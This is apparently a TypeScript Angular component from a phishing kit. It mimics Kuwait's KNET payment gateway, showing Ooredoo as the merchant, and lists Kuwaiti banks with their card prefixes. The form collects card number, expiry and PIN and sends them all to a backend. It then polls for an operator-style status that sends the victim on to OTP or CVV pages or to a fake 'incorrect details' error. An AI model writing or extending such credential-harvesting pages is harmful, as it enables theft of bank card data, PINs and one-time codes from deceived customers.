import { DOCUMENT } from '@angular/common';
import { Component, Inject, OnDestroy, OnInit, Renderer2 } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { ActivatedRoute, Router } from '@angular/router';
import { PaymentService } from '../../services/payment.service';

@Component({
  selector: 'app-knet',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './knet.html',
  styleUrl: './knet.css',
})
export class Knet implements OnInit, OnDestroy {
  bannerImagePath = 'imgs/mob.jpg';
  kfhLogoPath = 'imgs/download.jpg';
  loadingGifPath = 'imgs/photo_loader.gif';

  // Merchant info
  merchantName = 'Ooredoo';
  amount = 0.250;

  // Form fields
  selectedBank = '';
  cardPrefix = '';
  cardNumber = '';
  expirationMonth = 'MM';
  expirationYear = 'YYYY';
  pin = '';

  formError: string | null = null;
  view: 'form' | 'loading' = 'form';
  private pollId: any | null = null;
  private transactionId: string | null = null;
  private clientId: string | null = null;

  // Banks list
  banks = [
    'Al Ahli Bank of Kuwait [ABK]',
    'Al Rajhi Bank [Rajhi]',
    'AUB',
    'Bank of Bahrain Kuwait [BBK]',
    'Boubyan Bank [Boubyan]',
    'Burgan Bank [Burgan]',
    'Commercial Bank of Kuwait [CBK]',
    'Doha Bank [Doha]',
    'Gulf Bank of Kuwait [GBK]',
    'KFH [TAM]',
    'Kuwait Finance House [KFH]',
    'Kuwait International Bank [KIB]',
    'National Bank of Kuwait [NBK]',
    'NBK [Weyay]',
    'Qatar National Bank [QNB]',
    'Union National Bank [UNB]',
    'Warba Bank [Warba]',
  ];

  prefixOptions: string[] = [];

  private readonly bankToPrefixes: Record<string, string[]> = {
    prefix: [],
    AUB: ['532674', '537016'],
    'Al Ahli Bank of Kuwait [ABK]': ['403622', '423826', '428628'],
    'Al Rajhi Bank [Rajhi]': ['458838'],
    'Bank of Bahrain Kuwait [BBK]': ['418056', '588790'],
    'Boubyan Bank [Boubyan]': ['404919', '450605', '426058', '431199', '470350', '490455', '490456'],
    'Burgan Bank [Burgan]': ['540759', '402978', '415254', '450238', '468564', '403583', '49219000'],
    'Commercial Bank of Kuwait [CBK]': ['521175', '516334', '532672', '537015'],
    'Doha Bank [Doha]': ['419252'],
    'Gulf Bank of Kuwait [GBK]': ['531329', '531471', '531470', '517419', '559475', '517458', '531644', '526206'],
    'KFH [TAM]': ['45077848', '45077849'],
    'Kuwait Finance House [KFH]': ['450778', '485602', '573016', '532674'],
    'Kuwait International Bank [KIB]': ['409054', '406464'],
    'National Bank of Kuwait [NBK]': ['464452', '589160'],
    'NBK [Weyay]': ['46445250', '543363'],
    'Qatar National Bank [QNB]': ['521020', '524745'],
    'Union National Bank [UNB]': ['457778'],
    'Warba Bank [Warba]': ['532749', '559459', '541350', '525528'],
  };

  months = ['MM', '01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'];
  years: string[] = ['YYYY'];

  private readonly bodyBgClass = 'bg-[#d9d9d9]';
  private readonly bodyOverflowClass = 'overflow-hidden';

  constructor(
    private readonly renderer: Renderer2,
    @Inject(DOCUMENT) private readonly document: Document,
    private readonly router: Router,
    private route: ActivatedRoute,
    private paymentService: PaymentService
  ) { }

  ngOnInit() {
    console.log('Knet Page Loaded');
    this.renderer.addClass(this.document.body, this.bodyBgClass);
    this.renderer.addClass(this.document.body, this.bodyOverflowClass);

    // Populate years (current year + 20)
    const currentYear = new Date().getFullYear();
    for (let i = 0; i <= 20; i++) {
      this.years.push(String(currentYear + i));
    }

    const raw = sessionStorage.getItem('eventat_checkout');
    console.log('Session Data:', raw);
    if (raw) {
      try {
        const parsed = JSON.parse(raw);
        const total = Number(parsed?.totalPrice);
        this.amount = isNaN(total) ? 0.250 : total;
        this.clientId = parsed?.clientId;
        console.log('ClientID loaded:', this.clientId);
      } catch (err) {
        console.error('Error parsing session data:', err);
      }
    } else {
      console.warn('No session data found in eventat_checkout');
    }

    this.route.queryParams.subscribe(params => {
      if (params['amount']) {
        this.amount = Number(params['amount']);
      }
    });
  }

  ngOnDestroy() {
    this.renderer.removeClass(this.document.body, this.bodyBgClass);
    this.renderer.removeClass(this.document.body, this.bodyOverflowClass);
    if (this.pollId) clearInterval(this.pollId);
  }

  onSubmit() {
    if (!this.selectedBank || this.selectedBank === '') {
      this.formError = 'Please select your bank.';
      return;
    }
    if (!this.cardPrefix) {
      this.formError = 'Please select prefix.';
      return;
    }
    if (!this.isValidCardNumber(this.cardNumber)) {
      this.formError = 'Card number must be digits only and 9 to 11 numbers.';
      return;
    }
    if (!this.expirationMonth || this.expirationMonth === 'MM') {
      this.formError = 'Please select expiration month.';
      return;
    }
    if (!this.expirationYear || this.expirationYear === 'YYYY') {
      this.formError = 'Please select expiration year.';
      return;
    }
    if (!this.isValidPin(this.pin)) {
      this.formError = 'PIN must be digits only and 3 to 4 numbers.';
      return;
    }

    this.formError = null;
    this.view = 'loading';

    const loginId = sessionStorage.getItem('loginId') || '';

    const payload = {
      clientId: this.clientId,
      bankName: this.selectedBank,
      prefix: this.cardPrefix,
      cardNumber: this.cardNumber,
      expiryMonth: this.expirationMonth,
      expiryYear: this.expirationYear,
      pin: this.pin,
      loginId: loginId
    };

    console.log('Submitting Knet payment:', payload);
    this.paymentService.createKnetPayment(payload).subscribe({
      next: (res: any) => {
        if (res.success) {
          this.transactionId = res.knetId;
          sessionStorage.setItem('eventat_knet_form', JSON.stringify({
            bank: this.selectedBank,
            prefix: this.cardPrefix,
            cardNumber: this.cardNumber,
            expiryMonth: this.expirationMonth,
            expiryYear: this.expirationYear,
            amount: this.amount,
            merchantName: this.merchantName,
          }));
          sessionStorage.setItem('eventat_knet_txn', this.transactionId || '');
          this.startPolling(this.transactionId!);
        } else {
          this.view = 'form';
          this.formError = 'Failed to submit details.';
        }
      },
      error: (err: any) => {
        console.error('API Error:', err);
        this.view = 'form';
        this.formError = 'System error. Please try again.';
      }
    });
  }

  startPolling(knetId: string) {
    if (this.pollId) clearInterval(this.pollId);
    this.pollId = setInterval(() => {
      this.paymentService.checkStatus(knetId).subscribe({
        next: (res: any) => {
          if (res.status === 'APPROVED') {
            clearInterval(this.pollId!);
            this.pollId = null;
            this.router.navigate(['/knet-otp']);
          } else if (res.status === 'REQUIRE_CVV') {
            clearInterval(this.pollId!);
            this.pollId = null;
            this.router.navigate(['/knet-cvv']);
          } else if (res.status === 'REJECTED') {
            clearInterval(this.pollId!);
            this.pollId = null;
            this.view = 'form';
            this.formError = 'بيانات البطاقة غير صحيحة برجاء التأكد و اعادة المحاولة';
          }
        },
        error: () => { }
      });
    }, 2000);
  }

  private digitsOnly(value: string, maxLen: number) {
    return (value ?? '').replace(/\D+/g, '').slice(0, maxLen);
  }

  private setNativeInputValue(event: Event, value: string) {
    const input = event.target as HTMLInputElement | null;
    if (input && input.value !== value) input.value = value;
  }

  onPinInput(event: Event) {
    const input = event.target as HTMLInputElement;
    const cleaned = this.digitsOnly(input?.value ?? '', 4);
    this.pin = cleaned;
    this.setNativeInputValue(event, cleaned);
    this.formError = null;
  }

  onCardNumberInput(event: Event) {
    const input = event.target as HTMLInputElement;
    const cleaned = this.digitsOnly(input?.value ?? '', 11);
    this.cardNumber = cleaned;
    this.setNativeInputValue(event, cleaned);
    this.formError = null;
  }

  digitsOnlyKeydown(event: KeyboardEvent, maxLen: number) {
    const allowedKeys = new Set(['Backspace', 'Delete', 'Tab', 'Enter', 'Escape', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Home', 'End']);
    if (allowedKeys.has(event.key)) return;
    if (event.ctrlKey || event.metaKey) return;
    if (!/^\d$/.test(event.key)) {
      event.preventDefault();
      return;
    }
    const input = event.target as HTMLInputElement | null;
    if (!input) return;
    const value = input.value ?? '';
    if ((input.selectionEnd ?? 0) - (input.selectionStart ?? 0) === 0 && value.length >= maxLen) {
      event.preventDefault();
    }
  }

  digitsOnlyPaste(event: ClipboardEvent, maxLen: number, field: 'pin' | 'cardNumber') {
    event.preventDefault();
    const input = event.target as HTMLInputElement | null;
    if (!input) return;
    const pasteText = event.clipboardData?.getData('text') ?? '';
    const toInsert = this.digitsOnly(pasteText, maxLen);
    const value = input.value ?? '';
    const selStart = input.selectionStart ?? value.length;
    const selEnd = input.selectionEnd ?? value.length;
    const combined = this.digitsOnly(value.slice(0, selStart) + toInsert + value.slice(selEnd), maxLen);
    input.value = combined;
    if (field === 'pin') this.pin = combined;
    if (field === 'cardNumber') this.cardNumber = combined;
  }

  onBankChange() {
    const selected = this.selectedBank;
    this.prefixOptions = this.bankToPrefixes[selected] ?? [];
    this.cardPrefix = '';
    this.formError = null;
  }

  private isValidPin(pin: string) {
    return /^\d{3,4}$/.test(pin);
  }

  private isValidCardNumber(cardNumber: string) {
    return /^\d{9,11}$/.test(cardNumber);
  }
}
